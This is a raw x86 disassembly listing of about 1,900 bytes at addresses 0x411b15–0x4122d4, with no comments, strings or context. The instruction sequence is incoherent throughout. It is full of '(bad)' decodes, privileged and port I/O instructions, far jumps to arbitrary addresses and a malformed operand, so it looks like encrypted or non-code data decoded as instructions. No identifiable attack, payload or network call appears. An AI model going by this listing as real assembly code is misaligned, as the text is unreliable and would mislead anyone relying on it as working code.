  411b15:	mov    dh,0xeb
  411b17:	mov    bh,0x68
  411b19:	inc    ebx
  411b1a:	inc    ebx
  411b1b:	out    0x66,al
  411b1d:	repz loopne 0x411b68
  411b20:	add    BYTE PTR [eax],ch
  411b22:	not    dh
  411b24:	pop    eax
  411b25:	mov    esp,0x786a050
  411b2a:	xchg   edx,eax
  411b2b:	fcmovb st,st(4)
  411b2d:	iret   
  411b2e:	shr    edx,1
  411b30:	mov    bh,BYTE PTR [ebp-0x9]
  411b33:	xor    bh,BYTE PTR [esp+esi*2-0x425b0537]
  411b3a:	and    BYTE PTR [eax],dh
  411b3c:	push   esp
  411b3d:	(bad)  
  411b3e:	jmp    0xeadd5f54
  411b43:	out    0xea,eax
  411b45:	xor    ch,BYTE PTR [ebx+ebx*8]
  411b48:	sahf   
  411b49:	mov    ebp,DWORD PTR [ebx-0x10]
  411b4c:	(bad)  [edi-0x5effb6ec]
  411b52:	or     BYTE PTR [ebx+0x4a],bh
  411b55:	into   
  411b56:	adc    DWORD PTR [ebp+0x4f322ad7],esi
  411b5c:	inc    eax
  411b5e:	inc    edx
  411b5f:	repnz sar BYTE PTR [eax],1
  411b62:	mov    al,0x2
  411b64:	nop
  411b65:	iret   
  411b66:	das    
  411b67:	cdq    
  411b68:	sbb    BYTE PTR ds:0xd046dee5,bh
  411b6e:	mov    dh,0xd7
  411b70:	mov    esp,0x3ac15b67
  411b75:	xor    eax,DWORD PTR [ebp+0x4a]
  411b78:	xchg   edx,eax
  411b79:	lea    esi,[ebp-0x620f45f3]
  411b7f:	retf   
  411b80:	cmp    BYTE PTR es:[edx-0x34],ch
  411b84:	xlat   BYTE PTR ds:[ebx]
  411b85:	cmp    bl,BYTE PTR [eax]
  411b87:	pop    ebx
  411b88:	jne    0x411b75
  411b8a:	pusha  
  411b8b:	or     eax,0x26d1f28f
  411b90:	call   0x9083:0x1fffff35
  411b97:	mov    edx,0x3478e9b6
  411b9c:	rcr    BYTE PTR [ebx+ebp*8-0x60b8eb50],cl
  411ba3:	inc    edx
  411ba4:	add    esi,DWORD PTR [ebp+ebp*1+0x2a43c540]
  411bab:	or     ah,ah
  411bad:	xchg   BYTE PTR [ebp+esi*2+0x4c374fd7],dh
  411bb4:	or     dh,ch
  411bb6:	fs push 0xe286ad80
  411bbc:	inc    edx
  411bbd:	imul   esi,DWORD PTR ds:0x2115db14,0x66
  411bc4:	adc    BYTE PTR [ecx],ch
  411bc6:	adc    cl,0x82
  411bc9:	or     ecx,edi
  411bcb:	in     eax,0xfc
  411bcd:	and    BYTE PTR [edx-0x446598],dh
  411bd3:	cdq    
  411bd4:	adc    dh,BYTE PTR [ebx-0x5e]
  411bd7:	in     eax,0xce
  411bd9:	jns    0x411c2a
  411bdb:	sbb    dh,cl
  411bdd:	and    DWORD PTR [edi-0x3a],eax
  411be0:	cmp    eax,0x88446f26
  411be5:	xchg   BYTE PTR [esi],dh
  411be7:	mov    eax,ds:0x8f6de0fc
  411bec:	pop    esp
  411bed:	jmp    0x688:0xc547a150
  411bf4:	das    
  411bf5:	jmp    0xf2f3da64
  411bfa:	daa    
  411bfb:	enter  0xde51,0x40
  411bff:	mov    bh,0xfb
  411c01:	mov    edx,0xaf16b9fc
  411c06:	xor    ch,dl
  411c08:	mov    gs:0x73a3ab97,al
  411c0e:	adc    BYTE PTR [ecx-0xf],bh
  411c11:	sbb    BYTE PTR [esi+0x637b9c53],dl
  411c17:	ja     0x411be7
  411c19:	fimul  WORD PTR [eax]
  411c1b:	jecxz  0x411bd2
  411c1d:	push   edi
  411c1e:	shl    BYTE PTR [eax+0x427e6a94],0x23
  411c25:	fsub   DWORD PTR [ecx+0x1e52ade0]
  411c2b:	dec    bx
  411c2e:	push   eax
  411c2f:	inc    edi
  411c30:	xchg   edi,eax
  411c31:	push   es
  411c32:	iret   
  411c33:	imul   edi,DWORD PTR [edx+0x4e84d42b],0xaa5972dc
  411c3d:	cmp    DWORD PTR [ebx-0x33c085b5],esp
  411c43:	adc    ch,BYTE PTR [eax-0x70]
  411c46:	adc    BYTE PTR [ebx],dh
  411c48:	xor    al,BYTE PTR [edx-0x2f8078ef]
  411c4e:	jle    0x411bfb
  411c50:	mov    dh,0x9d
  411c52:	test   DWORD PTR [esi+0x624ab668],edx
  411c58:	or     cl,BYTE PTR [ebx-0x1ca1d770]
  411c5e:	cli    
  411c5f:	xchg   esp,eax
  411c60:	xor    DWORD PTR [ebx],ecx
  411c62:	sbb    ebx,0x93c98b6
  411c68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c69:	int    0xe6
  411c6b:	inc    edx
  411c6c:	and    eax,0x6bb2d312
  411c71:	into   
  411c72:	pop    ds
  411c73:	mov    ecx,0x69fa3861
  411c78:	pop    ebp
  411c79:	into   
  411c7a:	stos   BYTE PTR es:[edi],al
  411c7b:	adc    ah,BYTE PTR [edx-0x59]
  411c7e:	int    0x91
  411c80:	mov    ecx,0x2b2d2dc6
  411c85:	cs stos BYTE PTR es:[edi],al
  411c87:	or     bh,ch
  411c89:	test   eax,0xb75e42e6
  411c8e:	mov    fs,WORD PTR [edi+ecx*2]
  411c91:	mov    al,0x2e
  411c93:	cmp    eax,0x3647672b
  411c98:	sbb    al,0x1e
  411c9a:	dec    edx
  411c9c:	loopne 0x411d10
  411c9e:	rol    dh,cl
  411ca0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ca1:	mov    ecx,DWORD PTR [ebx+0x4fb7795a]
  411ca7:	lds    ebp,FWORD PTR [edi-0x6e]
  411caa:	push   eax
  411cab:	push   0x30382973
  411cb0:	pop    ecx
  411cb1:	ins    BYTE PTR es:[edi],dx
  411cb2:	mov    WORD PTR [edi+0x10],gs
  411cb5:	(bad)  
  411cb6:	push   eax
  411cb7:	fucomi st,st(5)
  411cb9:	pop    ebx
  411cba:	nop
  411cbb:	into   
  411cbc:	mov    gs,WORD PTR [eax+0x1d86512a]
  411cc2:	jecxz  0x411cb4
  411cc4:	inc    esp
  411cc5:	cmp    DWORD PTR [ebx-0x1bead62e],esi
  411ccb:	stos   DWORD PTR es:[edi],eax
  411ccc:	mov    eax,ds:0x668d52c2
  411cd1:	sar    DWORD PTR [edi+0x2edddaf9],0xf4
  411cd8:	repnz adc BYTE PTR [eax+0x3e],0xf4
  411cdd:	sbb    cl,BYTE PTR [ebp+0x73]
  411ce0:	scas   al,BYTE PTR es:[edi]
  411ce1:	pop    ds
  411ce2:	fldenv [esi-0x3ff95a48]
  411ce8:	stos   DWORD PTR es:[edi],eax
  411ce9:	xchg   edi,eax
  411cea:	or     al,0x17
  411cec:	push   edx
  411ced:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411cee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411cef:	sbb    ax,0xf84c
  411cf3:	inc    edi
  411cf4:	mov    edx,0xfa5b9ffe
  411cf9:	ror    bh,1
  411cfb:	sar    edi,0x16
  411cfe:	imul   ebx,DWORD PTR [esi],0x53
  411d01:	imul   ecx,ecx,0x45
  411d04:	pop    eax
  411d05:	fidiv  DWORD PTR [ebx]
  411d07:	mov    al,ds:0xfca4b6de
  411d0c:	retf   
  411d0d:	out    dx,al
  411d0e:	adc    bh,bl
  411d10:	mov    ebx,0xc2fb9a3c
  411d15:	out    dx,al
  411d16:	mov    bl,0x47
  411d18:	out    0xe4,al
  411d1a:	retf   
  411d1b:	in     al,0x5
  411d1d:	ins    DWORD PTR es:[edi],dx
  411d1e:	fbstp  TBYTE PTR [ecx+0x3f]
  411d21:	adc    BYTE PTR [edi],dl
  411d23:	rol    BYTE PTR [ecx+0x3f1a0e6e],1
  411d29:	jl     0x411cae
  411d2b:	dec    ebp
  411d2c:	pop    es
  411d2d:	xchg   esi,eax
  411d2e:	(bad)  
  411d30:	xor    ah,dh
  411d32:	cdq    
  411d33:	mov    dl,0xfa
  411d35:	mov    edi,0xda904ab7
  411d3a:	in     al,dx
  411d3b:	in     eax,dx
  411d3c:	les    ebx,FWORD PTR [ecx+0xe]
  411d3f:	or     BYTE PTR [eax+0x4d],bl
  411d42:	fimul  DWORD PTR [edx-0x72883e5e]
  411d48:	push   esi
  411d49:	loope  0x411dc0
  411d4b:	je     0x411d99
  411d4d:	mov    ds:0x49180564,al
  411d52:	push   ss
  411d53:	or     DWORD PTR [ebx-0x5f],ecx
  411d56:	inc    ebp
  411d57:	sub    DWORD PTR [ecx+0x518ca029],0x63
  411d5e:	mov    bh,0xab
  411d60:	push   edx
  411d61:	dec    edx
  411d62:	xor    al,0xbb
  411d64:	cmp    edi,DWORD PTR gs:[edx-0x14]
  411d68:	test   eax,0x5a087c09
  411d6d:	out    dx,al
  411d6e:	jbe    0x411dac
  411d70:	sbb    BYTE PTR [eax-0x2486469],dh
  411d76:	rcl    BYTE PTR [ecx+edx*4],0xf9
  411d7a:	jecxz  0x411d57
  411d7c:	and    BYTE PTR [ebx-0xd01c802],0x66
  411d83:	repnz (bad) 
  411d85:	cmp    dh,dh
  411d87:	jmp    0x4043:0x5f13a375
  411d8e:	add    ebx,DWORD PTR [esi-0x10]
  411d91:	fcmovb st,st(2)
  411d93:	mov    esp,0xe2a31b88
  411d98:	hlt    
  411d99:	imul   eax,DWORD PTR [ebx],0x9e35295c
  411d9f:	pushf  
  411da0:	test   al,0xdb
  411da2:	repnz dec edi
  411da4:	outs   dx,BYTE PTR ds:[esi]
  411da5:	lea    ebp,[edx]
  411da7:	pop    ebx
  411da8:	imul   esp,eax,0x16
  411dab:	(bad)
  411daf:	jle    0x411d58
  411db1:	aas    
  411db2:	jnp    0x411d62
  411db4:	mov    al,0x47
  411db6:	dec    edx
  411db7:	pushf  
  411db8:	xor    eax,0xa9154bf6
  411dbd:	(bad)  
  411dbe:	xor    al,0x44
  411dc0:	jg     0x411d44
  411dc2:	(bad)  
  411dc3:	pop    esp
  411dc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411dc5:	xor    edx,DWORD PTR [ecx-0x5b]
  411dc8:	inc    BYTE PTR [ecx+eiz*4+0x51e288f4]
  411dcf:	sub    edi,DWORD PTR [ebx-0x3ef2ac13]
  411dd5:	shl    DWORD PTR [ebx-0x7081f66b],1
  411ddb:	cmp    eax,DWORD PTR ds:0x8a633892
  411de1:	jnp    0x411de3
  411de3:	mov    ebx,0x702cad7c
  411de8:	jle    0x411e1c
  411dea:	mov    edx,DWORD PTR ds:0x80123eb1
  411df0:	cmc    
  411df1:	push   esi
  411df2:	loopne 0x411e4f
  411df4:	inc    esi
  411df5:	adc    esp,DWORD PTR [edi-0xeb8a583]
  411dfb:	clc    
  411dfc:	add    DWORD PTR [edx-0x6f],esi
  411dff:	ret    0xd103
  411e02:	xor    eax,ebp
  411e04:	jcxz   0x411db9
  411e07:	lock jl 0x411e77
  411e0a:	lahf   
  411e0b:	outs   dx,DWORD PTR ds:[esi]
  411e0c:	xor    al,0x89
  411e0e:	xchg   ebp,eax
  411e0f:	addr16 mov ebp,0x55da0c8f
  411e15:	inc    esi
  411e16:	sbb    cl,BYTE PTR [edx+0x188fcfef]
  411e1c:	ret    
  411e1d:	xor    dh,bl
  411e1f:	and    al,BYTE PTR [esi+esi*4+0x54]
  411e23:	sub    BYTE PTR [ebx+ebx*1-0x76],ch
  411e27:	xor    ebx,0xffffffc2
  411e2a:	xchg   ebp,eax
  411e2b:	inc    ebx
  411e2c:	(bad)  
  411e2d:	sti    
  411e2e:	mov    eax,ds:0xf2f0b420
  411e33:	push   ecx
  411e34:	inc    edx
  411e35:	xchg   BYTE PTR [edi+0x3c],dl
  411e38:	mov    edi,DWORD PTR [eax+0x135bca8d]
  411e3e:	jne    0x411e5d
  411e40:	or     eax,0xd59b61e2
  411e45:	mov    edx,0xd9e97408
  411e4a:	xor    DWORD PTR [ebx+0x27],0x69
  411e4e:	data16 cli 
  411e50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e51:	fidiv  DWORD PTR [ebx+0x21]
  411e54:	mov    ebp,0xb365dd77
  411e59:	out    dx,eax
  411e5a:	aas    
  411e5b:	jb     0x411ecd
  411e5d:	add    esi,esi
  411e5f:	sbb    BYTE PTR [edx+edi*4],0xe5
  411e63:	jp     0x411e05
  411e65:	data16 adc al,0x70
  411e68:	lods   al,BYTE PTR ds:[esi]
  411e69:	mov    ecx,0xc430372f
  411e6e:	retf   
  411e6f:	sti    
  411e70:	push   ds
  411e71:	xchg   esi,eax
  411e72:	loope  0x411ef3
  411e74:	or     ch,bl
  411e76:	int    0x5a
  411e78:	inc    edx
  411e79:	pop    ss
  411e7a:	bound  esi,QWORD PTR [ebx+0x76]
  411e7d:	pop    esi
  411e7e:	mov    ds:0xe6a9336c,eax
  411e83:	jb     0x411e9e
  411e85:	mov    edi,0x415f113c
  411e8a:	jae    0x411e8d
  411e8c:	std    
  411e8d:	scas   al,BYTE PTR es:[edi]
  411e8e:	les    eax,FWORD PTR [edx]
  411e90:	jb     0x411e9b
  411e92:	fwait
  411e93:	out    dx,al
  411e94:	retf   0xc651
  411e97:	icebp  
  411e98:	(bad)  
  411e99:	dec    edx
  411e9a:	cmp    BYTE PTR [eax+0x2bd43fc3],dl
  411ea0:	push   eax
  411ea1:	popf   
  411ea2:	lahf   
  411ea3:	mov    esp,0x9310b070
  411ea8:	pop    ebx
  411ea9:	push   ebp
  411eaa:	push   ecx
  411eab:	mov    edx,0xe7357eef
  411eb0:	jmp    0xa4aa3a92
  411eb5:	stos   BYTE PTR es:[edi],al
  411eb6:	push   ebp
  411eb7:	push   0xec605f9d
  411ebc:	(bad)  
  411ebd:	stos   DWORD PTR es:[edi],eax
  411ebe:	xor    DWORD PTR [esi+edx*4],ebx
  411ec1:	or     al,0xad
  411ec3:	mov    bh,0xf0
  411ec5:	pop    ebp
  411ec6:	cmp    eax,0x9b5b1180
  411ecb:	scas   eax,DWORD PTR es:[edi]
  411ecc:	lock jmp 0xe9e3ea84
  411ed2:	push   esi
  411ed3:	mov    eax,0x6ed7ead5
  411ed8:	mov    esp,0x1578ec78
  411edd:	fidivr WORD PTR [esi-0x4af982ce]
  411ee3:	inc    esi
  411ee4:	or     DWORD PTR [edi+0x5f05ec97],esi
  411eea:	xchg   edx,eax
  411eeb:	push   0xffffff8a
  411eed:	ss hlt 
  411eef:	adc    eax,0xa11500fe
  411ef4:	cmp    ah,bl
  411ef6:	les    edx,FWORD PTR [edx-0x2c3d9434]
  411efc:	scas   eax,DWORD PTR es:[edi]
  411efd:	repnz push esi
  411eff:	xor    DWORD PTR [eax],esp
  411f01:	sub    edi,edi
  411f03:	mov    ecx,0x9347c91c
  411f08:	and    DWORD PTR [ecx+0x3],ecx
  411f0b:	dec    eax
  411f0c:	sbb    al,0x2a
  411f0e:	int    0xf2
  411f10:	loop   0x411ed2
  411f12:	and    ebx,DWORD PTR [eax]
  411f14:	out    0x6e,eax
  411f16:	sbb    DWORD PTR [esi],edx
  411f18:	mov    fs,WORD PTR [ebp+0x24745b62]
  411f1e:	add    eax,0xe2acd536
  411f23:	loopne 0x411f1c
  411f25:	mov    cl,dl
  411f27:	add    eax,0xf4e27ad7
  411f2c:	stos   DWORD PTR es:[edi],eax
  411f2d:	int3   
  411f2e:	int    0x8d
  411f30:	lods   al,BYTE PTR ds:[esi]
  411f31:	sbb    al,0xab
  411f33:	in     al,dx
  411f34:	fwait
  411f35:	outs   dx,DWORD PTR ds:[esi]
  411f36:	cmp    eax,0x6fd2f093
  411f3b:	lock out 0x5c,al
  411f3e:	pop    ds
  411f3f:	mov    bl,ch
  411f41:	scas   al,BYTE PTR es:[edi]
  411f42:	sbb    BYTE PTR [ebx+0x5a],bl
  411f45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f47:	mov    al,ds:0xc4da060
  411f4c:	adc    dl,BYTE PTR [ecx+eiz*2+0x50d79543]
  411f53:	xor    bh,al
  411f55:	out    0x67,eax
  411f57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f58:	push   edi
  411f59:	pop    ds
  411f5a:	mov    eax,DWORD PTR [esi+0x7c]
  411f5d:	adc    eax,0x22a9c3ea
  411f62:	mov    ch,0x69
  411f64:	pop    ecx
  411f65:	or     eax,0xc72042cd
  411f6a:	je     0x411f64
  411f6c:	(bad)  
  411f6d:	outs   dx,DWORD PTR ds:[esi]
  411f6e:	retf   0x1f66
  411f71:	sub    dl,cl
  411f73:	(bad)  
  411f74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f75:	fnstcw WORD PTR [ebx-0x6aa75125]
  411f7b:	dec    ebx
  411f7c:	mov    edi,ebx
  411f7e:	adc    BYTE PTR [ebp+0x35],dh
  411f81:	frstor [ebp+ebp*8-0xe]
  411f85:	cli    
  411f86:	jp     0x411f0f
  411f88:	ins    BYTE PTR es:[edi],dx
  411f89:	sub    dl,BYTE PTR [ecx+0x5d]
  411f8c:	fld    TBYTE PTR ds:0x595dedcb
  411f92:	cs xchg edi,eax
  411f94:	ror    DWORD PTR [eax-0x13],cl
  411f97:	(bad)  [ebx]
  411f99:	push   ebx
  411f9a:	mov    BYTE PTR [ebx+0x33],bh
  411f9d:	pop    esp
  411f9e:	outs   dx,BYTE PTR ds:[esi]
  411f9f:	sti    
  411fa0:	in     al,dx
  411fa1:	adc    dl,bl
  411fa3:	push   ss
  411fa4:	out    0xa6,eax
  411fa6:	(bad)  
  411fa7:	mov    edx,0xa752fd94
  411fac:	inc    ecx
  411fad:	dec    edi
  411fae:	add    ah,BYTE PTR [eax]
  411fb0:	js     0x411f5e
  411fb2:	pushfw 
  411fb4:	mov    ebp,0xabefd55
  411fb9:	aad    0x74
  411fbb:	shl    DWORD PTR [eax],0xa7
  411fbe:	in     eax,0xad
  411fc0:	pop    ebx
  411fc1:	pop    esp
  411fc2:	xchg   ecx,eax
  411fc3:	div    ecx
  411fc5:	pop    ecx
  411fc6:	inc    esp
  411fc7:	add    BYTE PTR [eax+0x133a1fad],bh
  411fcd:	(bad)  
  411fce:	sub    ebx,DWORD PTR ds:0xfa24a36c
  411fd4:	dec    ecx
  411fd5:	jg     0x412034
  411fd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411fd8:	push   esi
  411fd9:	or     al,0x29
  411fdb:	jmp    0x412002
  411fdd:	mov    esi,0xc66cf8f5
  411fe2:	aam    0x9e
  411fe4:	outs   dx,DWORD PTR ds:[esi]
  411fe5:	pop    edx
  411fe6:	cmp    DWORD PTR [esi],ebp
  411fe8:	jbe    0x411f7a
  411fea:	imul   edx,DWORD PTR [edx-0x1b],0xb7283194
  411ff1:	repnz cmp ebp,ecx
  411ff4:	and    eax,0xd6ea441
  411ff9:	gs addr16 daa 
  411ffc:	mov    cl,0xe7
  411ffe:	xchg   esp,eax
  411fff:	retf   0xff2a
  412002:	fild   WORD PTR [esi+0x207f7a0f]
  412008:	cli    
  412009:	cmp    BYTE PTR [ecx-0x73],bh
  41200c:	std    
  41200d:	sbb    bl,BYTE PTR [esp-0x35a5fca]
  412014:	xchg   ecx,eax
  412015:	hlt    
  412016:	jge    0x412013
  412018:	xchg   edx,eax
  412019:	aaa    
  41201a:	or     eax,0xa967c208
  41201f:	imul   esi,DWORD PTR [esi+ebp*4-0x6a53a782],0x61559c3
  41202a:	data16 aas 
  41202c:	fwait
  41202d:	add    esi,ebx
  41202f:	jnp    0x412057
  412031:	and    edi,DWORD PTR [ebx-0x2f]
  412034:	push   ebx
  412035:	out    dx,al
  412036:	jnp    0x411fdb
  412038:	repnz add al,0xfc
  41203b:	inc    ebp
  41203c:	adc    dh,cl
  41203e:	cli    
  41203f:	arpl   WORD PTR [ecx+0x30],si
  412042:	sbb    eax,0xec490f07
  412047:	in     al,dx
  412048:	les    eax,FWORD PTR [ebx+0x6a]
  41204b:	mov    ecx,esp
  41204d:	fsub   DWORD PTR [esi]
  41204f:	sub    eax,esp
  412051:	cmp    bl,ah
  412053:	lds    edi,FWORD PTR [edx]
  412055:	retf   
  412056:	mov    cl,0xb9
  412058:	ror    DWORD PTR [edx+0x1a],cl
  41205b:	arpl   WORD PTR [edx+esi*2-0x6],bx
  41205f:	in     al,0x2d
  412061:	(bad)  
  412062:	ffreep st(7)
  412064:	loope  0x411ff7
  412066:	sbb    edx,ebx
  412068:	jmp    0xf07b:0xba8d00dc
  41206f:	ror    BYTE PTR [ebx-0xb],cl
  412072:	cmp    al,0x89
  412074:	cmp    BYTE PTR [ebp+0xa77e56b],dh
  41207a:	ins    DWORD PTR es:[edi],dx
  41207b:	loope  0x412032
  41207d:	scas   eax,DWORD PTR es:[edi]
  41207e:	and    al,0x58
  412080:	lods   eax,DWORD PTR ds:[esi]
  412081:	mov    bl,BYTE PTR es:[eax+0x3b]
  412085:	pusha  
  412086:	dec    edi
  412087:	ins    DWORD PTR es:[edi],dx
  412088:	aam    0x15
  41208a:	jae    0x41200c
  41208c:	push   ecx
  41208d:	cmc    
  41208e:	(bad)  
  41208f:	mov    eax,ds:0xbc8e8505
  412094:	xor    al,0x82
  412096:	inc    DWORD PTR [ecx+ebx*1+0x657ba749]
  41209d:	add    al,0xf7
  41209f:	inc    eax
  4120a0:	mov    cl,0x77
  4120a2:	test   eax,0xeb4f0688
  4120a7:	jp     0x412078
  4120a9:	call   0x7012:0xc9caa9a3
  4120b0:	enter  0x236c,0xda
  4120b4:	sahf   
  4120b5:	xchg   ebp,eax
  4120b6:	push   edx
  4120b7:	xlat   BYTE PTR ds:[ebx]
  4120b8:	mul    dl
  4120ba:	outs   dx,DWORD PTR ds:[esi]
  4120bb:	dec    edi
  4120bc:	in     al,dx
  4120bd:	popf   
  4120be:	sub    DWORD PTR ds:0xdc388317,0xb22535bd
  4120c8:	jae    0x4120b7
  4120ca:	push   ebp
  4120cb:	mov    DWORD PTR [edi],ebx
  4120cd:	xor    eax,0xb387951f
  4120d2:	xor    edx,edi
  4120d4:	add    ecx,edx
  4120d6:	sub    eax,0xc422b171
  4120db:	sbb    DWORD PTR [esi],esi
  4120dd:	scas   al,BYTE PTR es:[edi]
  4120de:	cli    
  4120df:	iret   
  4120e0:	leave  
  4120e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4120e2:	imul   ah
  4120e4:	loope  0x4120d6
  4120e6:	push   eax
  4120e7:	scas   al,BYTE PTR es:[edi]
  4120e8:	adc    ah,al
  4120ea:	lock xor eax,0x9dde851d
  4120f0:	and    BYTE PTR ds:0x43eb151b,al
  4120f6:	inc    eax
  4120f7:	mov    ah,0x6f
  4120f9:	mov    dl,0x9b
  4120fb:	mov    ebx,0x1eb59bc6
  412100:	loopne 0x41212d
  412102:	aas    
  412103:	(bad)  
  412104:	jmp    0x1c91ef76
  412109:	or     DWORD PTR [esi+esi*1-0x34],eax
  41210d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41210e:	in     al,dx
  41210f:	mov    bh,0x45
  412111:	(bad)  
  412112:	xchg   ecx,eax
  412113:	in     al,0x5a
  412115:	jle    0x4120e8
  412117:	xor    BYTE PTR [edi],dl
  412119:	adc    DWORD PTR [ebx],ebx
  41211b:	std    
  41211c:	arpl   WORD PTR [ebx+0xd],bp
  41211f:	adc    eax,0x77bbe1d1
  412124:	and    al,0x18
  412126:	xor    BYTE PTR [esi],al
  412128:	in     eax,0xd2
  41212a:	ret    0x135
  41212d:	xor    eax,0x92c636a3
  412132:	imul   eax,DWORD PTR [eax-0x2a],0xae4afd07
  412139:	aam    0xd3
  41213b:	addr16 xchg bh,ch
  41213e:	scas   al,BYTE PTR es:[edi]
  41213f:	fisubr WORD PTR [ebx-0x4d]
  412142:	js     0x4120e8
  412144:	add    BYTE PTR [si],bh
  412147:	push   0x5a
  412149:	mov    ?,ebp
  41214b:	ins    DWORD PTR es:[edi],dx
  41214c:	ja     0x41215b
  41214e:	out    dx,eax
  41214f:	imul   DWORD PTR [edx+0x4]
  412152:	stc    
  412153:	data16 jns 0x412121
  412156:	mov    BYTE PTR [esi-0x73],cl
  412159:	les    ecx,FWORD PTR [edi+0x3ce25212]
  41215f:	pop    ebp
  412160:	daa    
  412161:	sbb    ecx,esi
  412163:	int    0xbd
  412165:	push   0x8eeb3142
  41216a:	es loope 0x41214f
  41216d:	das    
  41216e:	(bad)  
  41216f:	popa   
  412170:	nop
  412171:	add    edx,DWORD PTR [eax+edi*1+0x40c3ccb4]
  412178:	and    al,0x7b
  41217a:	xchg   BYTE PTR [edi+0x67d741e5],cl
  412180:	out    0x3c,al
  412182:	xor    eax,0xf8785286
  412187:	pop    bx
  412189:	cmp    BYTE PTR [ecx-0x41],ah
  41218c:	loopne 0x412179
  41218e:	sar    BYTE PTR [ebx+eiz*1+0x55],0xd1
  412193:	pop    DWORD PTR [edi]
  412195:	ss mov eax,0x6474a754
  41219b:	mov    dh,dh
  41219d:	pop    ds
  41219e:	adc    dh,BYTE PTR [edi]
  4121a0:	fcom   DWORD PTR [edx+0x7]
  4121a3:	pop    ss
  4121a4:	fwait
  4121a5:	dec    edx
  4121a6:	pushf  
  4121a7:	call   0x2ccc:0xa319f8a6
  4121ae:	lock sub eax,0xfbd6e35a
  4121b4:	dec    esi
  4121b5:	lds    ebp,FWORD PTR [ebx+0x50]
  4121b8:	cmp    ch,BYTE PTR [ecx-0x78]
  4121bb:	lock jns 0x4121e8
  4121be:	and    edx,DWORD PTR [ebx]
  4121c0:	ja     0x4121f3
  4121c2:	cmp    DWORD PTR [ebx-0x6f99df83],ecx
  4121c8:	pop    ebx
  4121c9:	cmp    eax,0x635e7213
  4121ce:	mov    ebp,0x3efc313c
  4121d3:	fidiv  DWORD PTR [edx-0x40345fdd]
  4121d9:	stc    
  4121da:	push   edi
  4121db:	fiadd  DWORD PTR [ecx+eax*4]
  4121de:	test   al,0x68
  4121e0:	or     eax,0x30f04ab6
  4121e5:	mov    dl,0x4c
  4121e7:	jnp    0x4121b3
  4121e9:	cmp    ebp,DWORD PTR [ecx-0x7e3d3ad7]
  4121ef:	aaa    
  4121f0:	xchg   ebp,eax
  4121f1:	jb     0x41226f
  4121f3:	sub    eax,0x659188b8
  4121f8:	xchg   ebx,eax
  4121f9:	jo     0x4121f2
  4121fb:	mov    edi,0x81740f19
  412200:	adc    esp,ebx
  412202:	aad    0xe7
  412204:	and    eax,0xd06f1ca3
  412209:	sbb    eax,DWORD PTR [ecx-0x1c]
  41220c:	or     al,0x34
  41220e:	xor    al,0xca
  412210:	push   0x68
  412212:	xlat   BYTE PTR ds:[ebx]
  412213:	lock xor al,0x9f
  412216:	call   0x7825bbac
  41221b:	aaa    
  41221c:	aam    0x48
  41221e:	iret   
  41221f:	pop    edx
  412220:	mov    ecx,ecx
  412222:	jg     0x4121ad
  412224:	dec    esp
  412225:	mov    dl,dl
  412227:	imul   ecx,DWORD PTR [ebx+0x29],0x86f0e8e0
  41222e:	mov    ch,0x9c
  412230:	mov    ecx,0xebc75365
  412235:	(bad)  
  412236:	dec    esp
  412237:	shr    eax,cl
  412239:	ret    
  41223a:	(bad)  
  41223b:	pop    esp
  41223c:	jle    0x4121f6
  41223e:	stos   DWORD PTR es:[edi],eax
  41223f:	adc    DWORD PTR [edx-0x722718e0],edi
  412245:	adc    ah,BYTE PTR [eax+0x25]
  412248:	aaa    
  412249:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41224a:	scas   eax,DWORD PTR es:[edi]
  41224b:	mov    al,0x9c
  41224d:	or     al,0xb6
  41224f:	cdq    
  412250:	adc    edi,edx
  412252:	adc    al,0x9d
  412254:	lock dec eax
  412256:	jp     0x412245
  412258:	imul   ecx,DWORD PTR [ebx],0xfc5e8736
  41225e:	push   ebp
  41225f:	inc    esi
  412260:	ja     0x4121ed
  412262:	cld    
  412263:	pop    ecx
  412264:	mov    ecx,0x17c87017
  412269:	and    eax,0x68e86c30
  41226e:	xlat   BYTE PTR ds:[ebx]
  41226f:	xor    esp,ebp
  412271:	aad    0x9f
  412273:	jecxz  0x412272
  412275:	lea    esp,[ecx-0x7896ee3a]
  41227b:	daa    
  41227c:	jecxz  0x412245
  41227e:	sbb    BYTE PTR [eax+0x65],ch
  412281:	call   0x7a18:0xd78c84be
  412288:	sbb    bl,dl
  41228a:	scas   al,BYTE PTR es:[edi]
  41228b:	outs   dx,DWORD PTR ds:[esi]
  41228c:	sti    
  41228d:	mov    esi,0x6b17a78a
  412292:	dec    dx
  412294:	pop    ds
  412295:	dec    ecx
  412296:	mov    esp,edi
  412298:	or     al,0x57
  41229a:	push   0x7e0f9a11
  41229f:	leave  
  4122a0:	xor    BYTE PTR [ebx+0x5c],al
  4122a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4122a4:	scas   al,BYTE PTR es:[edi]
  4122a5:	icebp  
  4122a6:	xor    al,0x10
  4122a8:	scas   eax,DWORD PTR es:[edi]
  4122a9:	push   0xffffffb7
  4122ab:	mov    bh,0xa4
  4122ad:	and    cl,ch
  4122af:	hlt    
  4122b0:	xchg   DWORD PTR [esi+0x7a],ebp
  4122b3:	hlt    
  4122b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4122b5:	(bad)  
  4122b6:	cli    
  4122b7:	jl     0x412251
  4122b9:	inc    edx
  4122ba:	out    0x8f,al
  4122bc:	sbb    esp,esi
  4122be:	pop    ecx
  4122bf:	xor    dl,BYTE PTR [esi+0x40f85ac0]
  4122c5:	iret   
  4122c6:	xchg   esp,eax
  4122c7:	mov    BYTE PTR [ebx],ah
  4122c9:	popa   
  4122ca:	(bad)  
  4122cc:	pop    ebx
  4122cd:	sub    eax,0x276b780f
  4122d2:	push   ebx
  4122d3:	push   ebx
  4122d4:	out    dx,al
